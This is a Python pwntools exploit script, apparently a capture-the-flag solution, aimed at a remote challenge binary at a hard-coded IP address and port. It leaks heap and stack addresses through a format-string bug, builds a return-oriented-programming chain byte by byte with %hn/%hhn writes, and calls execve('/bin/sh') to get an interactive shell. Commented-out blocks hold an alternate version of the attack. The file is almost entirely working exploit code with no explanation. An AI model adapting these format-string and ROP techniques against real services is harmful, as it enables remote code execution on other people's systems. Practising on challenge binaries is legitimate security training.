from pwn import *

r = remote("168.119.108.148", 10010)

#r = process("./chall")
#gdb.attach(r)

payload = b'afaik'*2
payload += b"a"*(0x1000 - 5*2 - 4 - 2)
payload += b'\xe0\x0e\x41\x00\x00'

r.send(payload)

print(r.recv())

payload = "-- %7$lx %12$lx %47$s"
r.sendline(payload)



stuff = r.recvuntil(b"./chall").split(b" ")

heap = int(stuff[-3], 16)
our_heap = heap - 0x1000 - 0x10
stack = int(stuff[-2], 16)

ret_addr = stack - 0x130


twobyte_ret = ret_addr & 0xffff
payload = f"%{twobyte_ret}x" + "%12$hn"
r.sendline(payload)

pop_rax_ret = 0x000000000045a8f7
payload = "%247x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+1}x" + "%12$hn"
r.sendline(payload)
payload = "%168x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+2}x" + "%12$hn"
r.sendline(payload)
payload = "%69x" + "%47$hhn" 
r.sendline(payload)
#
#payload = f"%{twobyte_ret+3}x" + "%12$hn"
#r.sendline(payload)
#payload = "%47$n" 
#r.sendline(payload)
#
#payload = f"%{twobyte_ret+4}x" + "%12$n"
#r.sendline(payload)
#payload = "%47$n" 
#r.sendline(payload)


# 59
payload = f"%{twobyte_ret+8}x" + "%12$hn"
r.sendline(payload)
payload = "%59x" + "%47$ln" 
r.sendline(payload)


#pop_rdi_ret = 0x00000000004018da
payload = f"%{twobyte_ret+0x10}x" + "%12$hn"
r.sendline(payload)
payload = "%218x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 1}x" + "%12$hn"
r.sendline(payload)
payload = "%24x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 2}x" + "%12$hn"
r.sendline(payload)
payload = "%64x" + "%47$n" 
r.sendline(payload)


#pop_rdi_ret = 0x00000000004018da
payload = f"%{twobyte_ret+0x20}x" + "%12$hn"
r.sendline(payload)
payload = "%218x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 1}x" + "%12$hn"
r.sendline(payload)
payload = "%24x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 2}x" + "%12$hn"
r.sendline(payload)
payload = "%64x" + "%47$n" 
r.sendline(payload)




'''
heap_real = heap - 0x10 - 0x1000 + 1
h1 = heap_real & 0xff
h2 = (heap_real//0x100) & 0xff
h3 = (heap_real//0x10000) & 0xff
h4 = (heap_real//0x1000000) & 0xff
payload = f"%{twobyte_ret+0x20 + 8}x" + "%12$hn" 
r.sendline(payload)
payload = f"%{h1}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 9}x" + "%12$hn" 
r.sendline(payload)
payload = f"%{h2}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 0xa}x" + "%12$hn"
r.sendline(payload)
payload = f"%{h3}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 0xb}x" + "%12$hn"
r.sendline(payload)
payload = f"%{h4}x" + "%47$ln" 
r.sendline(payload)
'''


binsh = ret_addr + 9*8
b1 = binsh & 0xff
b2 = (binsh // 0x100) & 0xff
b3 = (binsh // 0x10000) & 0xff
b4 = (binsh // 0x1000000) & 0xff
b5 = (binsh // 0x100000000) & 0xff
b6 = (binsh // 0x10000000000) & 0xff
payload = f"%{twobyte_ret+0x20 + 8}x" + "%12$hn" 
r.sendline(payload)
payload = f"%{b1}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 9}x" + "%12$hn" 
r.sendline(payload)
payload = f"%{b2}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 0xa}x" + "%12$hn"
r.sendline(payload)
payload = f"%{b3}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x20 + 0xb}x" + "%12$hn"
r.sendline(payload)
payload = f"%{b4}x" + "%47$hhn" 
r.sendline(payload)
payload = f"%{twobyte_ret+0x20 + 0xc}x" + "%12$hn"
r.sendline(payload)
payload = f"%{b5}x" + "%47$hhn" 
r.sendline(payload)
payload = f"%{twobyte_ret+0x20 + 0xd}x" + "%12$hn"
r.sendline(payload)
payload = f"%{b6}x" + "%47$ln" 
r.sendline(payload)


# pop_rsi_ret = 0x0000000000404cfe
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x10}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0xfe}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x10 + 1}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x4c}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x10 + 7}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x40}x" + "%47$ln" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x10 + 2}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x40}x" + "%47$ln" 
r.sendline(payload)








# syscall = 0x00000000004012e3
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0xe3}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 1}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x12}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 2}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x40}x" + "%47$ln" 
r.sendline(payload)


# /bin/sh\x00 0068732f6e69622f
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 8}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x2f}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 9}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x62}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 0xa}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x69}x" + "%47$hhn" 
r.sendline(payload)
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 0xb}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x6e}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 0xc}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x2f}x" + "%47$hhn" 
r.sendline(payload)
#
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 0xd}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x73}x" + "%47$hhn" 
r.sendline(payload)
payload = f"%{twobyte_ret+0x10 + 0x10 + 0x20 + 0xe}x" + "%12$hn"
r.sendline(payload)
payload = f"%{0x68}x" + "%47$hn" 
r.sendline(payload)




payload = "\n"
r.sendline(payload)




'''
s1 = ret_addr & 0xff
s2 = (ret_addr//0x100) & 0xff
s3 = (ret_addr//0x10000) & 0xff
s4 = (ret_addr//0x1000000) & 0xff
s5 = (ret_addr//0x100000000) & 0xff
s6 = (ret_addr//0x10000000000) & 0xff


r1 = (heap+0x8) & 0xff
r2 = r1 + 1
r3 = r2 + 1
r4 = r3 + 1
r5 = r4 + 1
r6 = r5 + 1

print(hex(r1) + hex(r2) + hex(r3) + hex(r4) + hex(r5) + hex(r6))

printf = 0x410ee0


print("heap:" + hex(heap))
print("stack_target:" + hex(ret_addr))
print("byte1: " + hex(s1))

# change stack - 12$
payload = b'%' + str(heap+0x8).encode("utf-8") + b'x' + b'%12$ln'
r.sendline(payload)

# change text_addr - 47$
payload = f"%{s1}x" + '%47$hhn'
payload += f"%{0x100 - s1 + r2}x" + "%12$hhn" + f"%{0x100 - r2 + s2}x" + '%47$hhn'
#payload += f"%{0x100 - s2 + r3}x" + "%12$hhn" + f"%{0x100 - r3 + s3}x" + '%47$hhn'
#payload += f"%{0x100 - s3 + r4}x" + "%12$hhn" + f"%{0x100 - r4 + s4}x" + '%47$hhn'
#payload += f"%{0x100 - s4 + r5}x" + "%12$hhn" + f"%{0x100 - r5 + s5}x" + '%47$hhn'
#payload += f"%{0x100 - s5 + r6}x" + "%12$hhn" + f"%{0x100 - r6 + s6}x" + '%47$hhn'
r.sendline(payload)


r.sendline("hitmenow")


# change heap
payload = b'\x00' + b"/bin/sh\x00"
payload +=  b"a"*(0x1000-len(payload))  
#payload += p64(0)*2
#payload += p64(printf) + p64(stack) + p64(0x10000)
r.sendline(payload)

pop_rax_ret = 0x000000000045a8f7
pop_rdi_ret = 0x00000000004018da
pop_rsi_ret = 0x0000000000404cfe
pop_rdx_ret = 0x00000000004017df
syscall = 0x00000000004012e3


# change return address
roppayload = p64(pop_rax_ret) + p64(59)
roppayload += p64(pop_rdi_ret) + p64(ret_addr + 8*9)
roppayload += p64(pop_rsi_ret) + p64(0)
roppayload += p64(pop_rdx_ret) + p64(0)
roppayload += p64(syscall)
roppayload += b"/bin/sh\x00"
r.sendline(roppayload)

'''

r.interactive()